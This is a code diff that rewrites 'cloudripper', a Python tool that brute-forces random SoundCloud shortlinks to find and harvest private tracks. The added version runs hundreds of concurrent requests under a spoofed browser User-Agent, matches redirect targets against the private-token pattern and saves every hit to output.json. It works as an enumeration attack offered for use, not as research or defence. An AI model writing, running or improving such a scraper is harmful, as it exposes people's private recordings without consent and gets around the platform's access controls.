@@ -1,193 +1,176 @@
-#sound-cloudripper, [scalable update]
+#!/usr/bin/env python3
+from __future__ import annotations
+
 import argparse
 import asyncio
-import random
-import string
-import aiohttp
-import re
-import os
-from colorama import Fore
 import json
-import xml.etree.ElementTree as ET
+import random
+import re
+import string
+import time
+from pathlib import Path
 from urllib.parse import urlparse, urlunparse
 
-#=====================CORE=====================================>>
-#==============================================================>>
-async def fetch_url(session, url):
-    async with session.get(url, allow_redirects=False) as response:
-        return response, await response.text()
+import aiohttp
+from colorama import Fore, Style, init
 
-async def main(num_runs, threads):
-    #keep track of total requests
-    total_requests = 0
+init(autoreset=True)
 
-    matched_urls = []
-    print(Fore.LIGHTGREEN_EX + "\n[!] Harvesting private tracks...\n\n" + Fore.RESET)
-    for _ in range(num_runs):
-        #random link gen
-        urls = [f"https://on.soundcloud.com/{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))}" for _ in range(threads)]
-        #aiohttp x async super multithread of doom
-        async with aiohttp.ClientSession() as session:
-            tasks = [fetch_url(session, url) for url in urls]
-            responses = await asyncio.gather(*tasks)
+CHARSET = string.ascii_letters + string.digits
+PRIVATE_RE = re.compile(r"/s-[a-zA-Z0-9]{11}")
+OUTPUT = Path("output.json")
 
-            for url, (response, text) in zip(urls, responses):
-                #intercept redirection code, extract Location URL
-                if response.status == 302:
-                    full_url = response.headers.get('Location', '')
-                    url_final = urlunparse(urlparse(full_url)._replace(query=''))
-                    #Regex to match private tokens
-                    match = re.search(r'/s-[a-zA-Z0-9]{11}', url_final)
-
-                    private_track = await is_private_track(session,url_final) if client_id else True
-
-                    if match and private_track:
-                        if(args.verbose or args.very_verbose):
-                            print(Fore.GREEN + "[+] Valid URL: ", url)
-                        total_requests += 1
-                        matched_urls.append(url_final)
-                    else:
-                        if(args.very_verbose):
-                            print(Fore.RED + "[-] Invalid URL: ", url)
-                        total_requests += 1
-                else:
-                    if(args.very_verbose):
-                        print(Fore.RED + "[-] Invalid URL: ", url)
-                    total_requests += 1
-    #============================================================================================
-    #===================ON PROGRAM FINISH========================================================
-
-    print(Fore.YELLOW + "\n[!] Finished !", len(matched_urls) ,"private tracks found on" , total_requests ,"requests <3")
-
-    #END OF MAIN SECTION ===============================================================================
-
-    if args.requests is None:
-        print(Fore.LIGHTYELLOW_EX + "[?] use 'ripper.py -h' or '--help' to view commands")
-
-    #export to xml if xml switch is true
-    if (args.xml_export):
-        xml_export(matched_urls)
-    
-    #export to json if json switch is true
-    if (args.json_export):
-        json_export(matched_urls)
+BANNER = f"""{Fore.LIGHTGREEN_EX}
+  ╔══════════════════════════════╗
+  ║  C L O U D R I P P E R  v2  ║
+  ╚══════════════════════════════╝{Style.RESET_ALL}
+"""
 
 
-#=======================additional functions=====================================================================
-def xml_export(links):
-    print(Fore.MAGENTA + "\n[+] XML export...")
-    data = ET.Element("data")
-    if not os.path.exists("output.xml"):
-        print(Fore.MAGENTA + "[+] Creating 'output.xml'...")
-        data = ET.Element("data")
-    else:
-        tree = ET.parse("output.xml")
-        data = tree.getroot()
+class Stats:
+    def __init__(self) -> None:
+        self.total = 0
+        self.hits = 0
+        self._t0 = time.perf_counter()
 
-    for link in links:
-        random_name = link.split("/")[-3]
-        user_element = next((user for user in data.findall("user") if user.get("name") == random_name), None)
+    @property
+    def elapsed(self) -> float:
+        return time.perf_counter() - self._t0
 
-        if user_element is None:
-            user_element = ET.Element("user")
-            user_element.set("name", random_name)
-            data.append(user_element)
-
-        link_element = ET.Element("link")
-        link_element.text = link
-        user_element.append(link_element)
-    ET.ElementTree(data).write("output.xml", encoding="utf-8", xml_declaration=True)
-    print(Fore.GREEN + "\n[+] Done !\n")
-
-def json_export(links):
-    print(Fore.MAGENTA + "\n[+] JSON export...")
-    
-    data = {}
-    
-    if os.path.exists("output.json"):
-        with open("output.json", "r") as f:
-            data = json.load(f)
-    
-    for link in links:
-        random_name = link.split("/")[-3]
-        
-        if random_name not in data:
-            data[random_name] = []
-        
-        data[random_name].append(link)
-    
-    with open("output.json", "w") as f:
-        json.dump(data, f, indent=4)
-    
-    print(Fore.GREEN + "\n[+] Done !\n")
+    @property
+    def rate(self) -> float:
+        e = self.elapsed
+        return self.total / e if e > 0 else 0.0
 
 
-async def is_private_track(session, url):
-    SOUNDCLOUD_API_BASE_URL = 'https://api-v2.soundcloud.com'
-    async with session.get(f'{SOUNDCLOUD_API_BASE_URL}/resolve?client_id={client_id}&url={url}') as response:
-        if response.status == 401:
-            return True
+async def probe(
+    session: aiohttp.ClientSession,
+    sem: asyncio.Semaphore,
+    stats: Stats,
+    verbose: int,
+) -> str | None:
+    code = "".join(random.choices(CHARSET, k=5))
+    url = f"https://on.soundcloud.com/{code}"
+    try:
+        async with sem:
+            async with session.get(url, allow_redirects=False) as r:
+                stats.total += 1
+                if r.status == 302:
+                    loc = r.headers.get("Location", "")
+                    clean = urlunparse(urlparse(loc)._replace(query=""))
+                    if PRIVATE_RE.search(clean):
+                        return clean
+                    if verbose >= 1:
+                        print(f"\n{Fore.BLUE}  ~ public   {clean}{Style.RESET_ALL}")
+                elif verbose >= 2:
+                    print(f"\n{Fore.RED}  - miss     {url}{Style.RESET_ALL}")
+    except Exception:
+        stats.total += 1
+    return None
 
-        track_data = await response.json()
-        
-        if not track_data:
-            return False
-        
-        if track_data.get('sharing') == 'private':
-            return True
-        else:
-            return False
+
+async def stat_loop(stats: Stats, stop: asyncio.Event) -> None:
+    while not stop.is_set():
+        print(
+            f"\r{Fore.CYAN}{stats.elapsed:6.0f}s "
+            f"{Fore.WHITE}{stats.total:>10,} req  "
+            f"{Fore.GREEN}{stats.hits:>4} hits  "
+            f"{Fore.YELLOW}{stats.rate:>7.0f} req/s{Style.RESET_ALL}   ",
+            end="",
+            flush=True,
+        )
+        await asyncio.sleep(0.4)
 
 
+async def run(concurrency: int, verbose: int) -> None:
+    results: list[str] = []
+    seen: set[str] = set()
+    stats = Stats()
+    stop = asyncio.Event()
 
-#ENTRY POINT
+    connector = aiohttp.TCPConnector(
+        limit=concurrency + 200,
+        limit_per_host=0,
+        ttl_dns_cache=600,
+        enable_cleanup_closed=True,
+    )
+    session_timeout = aiohttp.ClientTimeout(total=10, connect=5)
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+
+    async with aiohttp.ClientSession(
+        connector=connector,
+        headers=headers,
+        timeout=session_timeout,
+    ) as session:
+        sem = asyncio.Semaphore(concurrency)
+        tasks: set[asyncio.Task] = set()
+        stat_task = asyncio.create_task(stat_loop(stats, stop))
+
+        def _fill() -> None:
+            while len(tasks) < concurrency:
+                t = asyncio.create_task(probe(session, sem, stats, verbose))
+                tasks.add(t)
+
+        _fill()
+
+        try:
+            while True:
+                done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+                tasks.difference_update(done)
+                _fill()
+
+                for t in done:
+                    url = t.result()
+                    if url and url not in seen:
+                        seen.add(url)
+                        stats.hits += 1
+                        results.append(url)
+                        print(f"\n{Fore.GREEN}[+] {url}{Style.RESET_ALL}")
+                        OUTPUT.write_text(json.dumps(results, indent=2))
+
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            stop.set()
+            stat_task.cancel()
+            for t in tasks:
+                t.cancel()
+            await asyncio.gather(*tasks, stat_task, return_exceptions=True)
+
+    print(
+        f"\n\n{Fore.YELLOW}[!] Stopped.  "
+        f"{stats.hits} private tracks  /  {stats.total:,} requests  "
+        f"({stats.rate:.0f} req/s){Style.RESET_ALL}"
+    )
+    if results:
+        OUTPUT.write_text(json.dumps(results, indent=2))
+        print(f"{Fore.GREEN}[+] Saved → {OUTPUT}{Style.RESET_ALL}")
+
+
+def main() -> None:
+    print(BANNER)
+    p = argparse.ArgumentParser(
+        description="Bruteforce SoundCloud shortlinks to find private tracks"
+    )
+    p.add_argument(
+        "-c", "--concurrency",
+        type=int, default=200, metavar="N",
+        help="concurrent requests (default: 200)",
+    )
+    p.add_argument(
+        "-v", "--verbose",
+        action="count", default=0,
+        help="-v show public tracks, -vv show all misses",
+    )
+    args = p.parse_args()
+
+    print(
+        f"{Fore.CYAN}[*] {args.concurrency} concurrent workers — "
+        f"Ctrl+C to stop\n{Style.RESET_ALL}"
+    )
+    try:
+        asyncio.run(run(args.concurrency, args.verbose))
+    except KeyboardInterrupt:
+        pass
+
+
 if __name__ == "__main__":
-    client_id_guide_link = "https://github.com/zackradisic/node-soundcloud-downloader?tab=readme-ov-file#client-id"
-
-    print(Fore.LIGHTGREEN_EX + "\n------------------------------------------")
-    print(Fore.LIGHTGREEN_EX + "/ / / / / " + Fore.LIGHTYELLOW_EX + "C L O U D R I P P E R" + Fore.LIGHTGREEN_EX + " / / / / /")
-    print(Fore.LIGHTGREEN_EX + "------------------------------------------" + Fore.RESET)
-    print(Fore.RESET + "created by " + Fore.MAGENTA + "yuuechka<3" + Fore.RESET + " & " + Fore.LIGHTRED_EX + "fancymalware(mk0)" + Fore.RESET)
-    print(Fore.LIGHTGREEN_EX + "------------------------------------------" + Fore.RESET)
-    #ARGS PARSER --------------------------------------------------------------------------------------------
-    parser = argparse.ArgumentParser(description="-----manual-----")
-    parser.add_argument('-r', '--requests', type=int, help="number of base requests")
-    parser.add_argument('-t', '--threads', type=int, help="number of simultaneous threads (multiplies the nbr of requests)")
-    parser.add_argument('-x', '--xml_export', action='store_true', help="export found tracks in a XML file")
-    parser.add_argument('-j', '--json_export', action='store_true', help="export found tracks in a JSON file")
-    parser.add_argument('-v', '--verbose', action='store_true', help="verbose mode, show more informations")
-    parser.add_argument('-vv', '--very_verbose', action='store_true', help="very verbose mode, show ALL informations")
-    parser.add_argument('-c', '--client_id', help="soundcloud api key needed for checking " +
-                        f"if track is not deleted and private. {client_id_guide_link}")
-    #todo : -? <-> bruteforces private token
-    #todo : -? <-> proxylist support ?
-    #--------------------------------------------------------------------------------------------------------
-    # take arguments in 'args'
-    args = parser.parse_args()
-
-    client_id = args.client_id
-    if not client_id:
-        print("\nfor more accurate results, this tool needs a soundcloud client id. " +
-              "without it, some found tracks can be deleted or not private\n" +
-              Fore.LIGHTGREEN_EX + client_id_guide_link + Fore.RESET + " <- how to get it\n")
-    
-        client_id = input("[?] enter the client id " +
-                        f"(press {Fore.LIGHTYELLOW_EX}ENTER{Fore.RESET} to skip): ")
-    
-    ###
-    if(args.requests is not None):
-        if(args.threads is not None):
-            runs = args.requests * args.threads
-            print(Fore.LIGHTGREEN_EX + "\n[!] starting cloudripper for exactly ", runs, " requests...")
-            asyncio.run(main(args.requests, args.threads))
-        else:
-            print(Fore.LIGHTGREEN_EX + "\n[!] starting cloudripper for exactly ", args.requests , " requests...")
-            asyncio.run(main(args.requests, 1))
-    else:
-        print(Fore.YELLOW + "\n[?] no requests number set")
-        print(Fore.LIGHTGREEN_EX + "[!] starting cloudripper with the default params (25 requests, verbose)")
-        args.verbose = True
-        if(args.threads is None):
-            asyncio.run(main(25, 1))
-        else:
-            asyncio.run(main(25, args.threads))
+    main()
